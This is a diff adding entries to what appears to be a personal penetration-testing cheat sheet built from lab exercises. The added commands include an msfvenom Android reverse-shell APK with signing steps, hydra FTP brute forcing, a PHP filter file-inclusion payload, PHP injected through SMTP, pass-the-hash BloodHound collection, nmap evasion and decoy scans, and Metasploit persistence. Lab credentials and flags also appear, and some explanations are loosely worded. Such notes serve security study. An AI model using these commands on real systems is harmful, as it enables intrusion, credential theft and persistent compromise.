@@ -1,5 +1,222 @@
-
 #Important commands in future goal
+
+# Best WEbsite for vulnerability research 
+
+ rapid7.com/db 
+ github with poc of exploit name 
+ searchsploit exploitname
+ exploitdb 
+ 
+
+
+
+# capture packet with specific length 
+
+ http && ip.src == 10.251.23.139  && frame.len == 351
+
+
+
+# cvss and vpr 
+ 
+ cvss given rating based on impact, it is a open source it used long time 2005  
+
+ vpr given rating based on risk; it is not open source , it is mordern used 
+
+ 
+# How to vulnerbility stem: 
+
+ there are 5 categeroies for vulnerbility stem; 
+ 
+ 1)  Operating system (privilege Escalation)
+
+ 2)  MissConfigure Issue ( Incorrectly configure application )  # database leaking password 
+
+ 3)  Weak / Default creds (admin / admin) 
+
+ 4)  Application Logic ( Poorly written code by developer ) Incorretly setup parameter inside userinput 
+
+ 5)  Human Factor (Phishing) 
+
+
+############### How to Exploit file inclusion using include function 
+
+GET /file.php?page=php://filter/convert.base64-encode/resource=index
+
+
+# hOW TO bypass ids then we can -sN null -sF -sX to xms 
+
+to bypass ids not firewall to bypass firewall then you can -sA -sW 
+
+# brute force attack on different ftp port 
+
+hydra -L user.txt -P /usr/share/wordlists/rockyou.txt  -s 10021 ftp://10.10.127.6 
+
+-s to specify port 
+
+# check version in apt 
+
+sudo apt list wireshark -a 
+
+
+# How to use smtp protocol 
+
+nc -vv 10.10.207.53  25
+10.10.207.53: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.10.207.53] 25 (smtp) open
+220 bento.localdomain ESMTP Postfix THM{5b31ddfc0c11d81eba776e983c35e9b5}
+helo pentest
+250 bento.localdomain
+mail from:pentestblog@gmail.com
+250 2.1.0 Ok
+rcpt to:bento.localdomain
+550 5.1.1 <bento.localdomain>: Recipient address rejected: User unknown in local recipient table
+rcpt to: pent
+550 5.1.1 <pent>: Recipient address rejected: User unknown in local recipient table
+rcpt to: frank
+250 2.1.5 Ok
+data
+354 End data with <CR><LF>.<CR><LF>
+subject : plz subscribe 
+<?php echo("ssyte"); ?>
+
+
+
+
+# how to login imap 
+
+$ telnet 10.10.157.51 143
+Trying 10.10.157.51...
+Connected to 10.10.157.51.
+Escape character is '^]'.
+* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
+c1 login frank D2xc9CgD
+* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
+c1 OK LOGIN Ok.
+
+c2 LIST "" "*" # to seet list 
+
+C3 EXAMINE INBOX.Sent # to examine list 
+
+
+
+# what is firewall and ids 
+
+firewall is software and hardware it is used to monitring and preventing incoming and outgoind traffic from any network sources . 
+
+ids is used to monitring and alerting icoming traffic from network sources it can't block traffic it only alert them . 
+
+
+# This is decoy scan 
+
+ sudo nmap -e tun0 -D 10.10.10.10,10.10.10.11,10.10.10.12,10.10.10.13,192.168.43.198  10.10.119.225 -p21 
+
+
+# how to check basic file permission in powershel 
+get-acl filename 
+# hwo to check registry perssion using powershell command 
+
+get-acl "HKLM:\Software\Microsoft\Windows NT\CurrentVersion" 
+
+# how to check schedule task in windows powershell
+
+Get-ScheduledTaskInfo | Where-Object {$_.State -eq 'Running'}
+
+# make persistense payload in android 
+https://github.com/rohitnishad613/PersistenceScript.git
+
+# using this commad you can grep perfect line 
+
+grep -B6   "8089" scan_172_17_network.nmap 
+
+
+# You can perform single scan or full scan using nmap nse script 
+
+ sudo nmap -sS 10.10.87.149 -p 80 --script http* # this is goes for full scan 
+
+  sudo nmap -sS 10.10.87.149 -p 80 --script http-enum # this is goes for single scan 
+
+
+# Script Categories and Example 
+
+Script Category	Description
+auth	Authentication related scripts
+broadcast	Discover hosts by sending broadcast messages
+brute	Performs brute-force password auditing against logins
+default	Default scripts, same as -sC
+discovery	Retrieve accessible information, such as database tables and DNS names
+dos	Detects servers vulnerable to Denial of Service (DoS)
+exploit	Attempts to exploit various vulnerable services
+external	Checks using a third-party service, such as Geoplugin and Virustotal
+fuzzer	Launch fuzzing attacks
+intrusive	Intrusive scripts such as brute-force attacks and exploitation
+malware	Scans for backdoors
+safe	Safe scripts that won’t crash the target
+version	Retrieve service versions
+vuln	Checks for vulnerabilities or exploit vulnerable services
+
+# How to create windows persistent payload 
+
+ exploit(windows/local/persistence) > session -i 1 
+
+# how to connect to rdp server using windows command 
+
+rdesktop -u Administrator 10.10.31.96  -d controller.local  
+
+
+# how to make android hacking payload 
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.95 LPORT=9001 R > androids.apk   
+keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 # create passkey
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore androids.apk alias_name
+
+
+# How to open terminal folder in gui using linux terminal 
+
+xdg-open /folder 
+
+#How to collect json file from target computer using own terminal 
+
+ # here you need convert hash in ntlm 
+
+python3 bloodhound.py -u Administrator   -ns 10.10.54.188  -d CONTROLLER.local  -c All --hashes 2777B7FEC870E04DDA00CD7260F7BEE6:2777B7FEC870E04
+
+
+#you can scan your local network by using arp scan 
+
+sudo arp-scan --localnet
+
+
+#tcpdump is used to caputure network tracffic jus like wireshark command line tool 
+
+ sudo tcpdump -i wlan0 arp 
+
+ icmp ping 
+
+# How to change java configuration how to fix bloodhound error 
+install neo4j 
+install bloodhound 
+
+change java version 
+update-alternatives --config java # choose 11 
+update-java-alternatives -list # show list 
+
+
+
+# You can appliy two filter 
+
+ 1) Capture Filter
+ 2) Display Filter 
+
+  1) Capture Filter : only filter specific tcp or udp any thiks traffic 
+ 
+  2) Display Filter: is apply on display you can use as grep  
+
+   specific port > tcp.port == 21 
+  
+   same time two port you can see 
+
+ tcp.port == 80 or tcp.port == 21
+  
 # windows credential 
 
 ### What is Powershell ? How it Works 
@@ -1500,6 +1717,7 @@ git push -u origin main
 …or import code from another repository
 You can initialize this repository with code from a Subversion, Mercurial, or TFS project.
 
+git pull # you can update your repo
 
 # meterpreter command
 
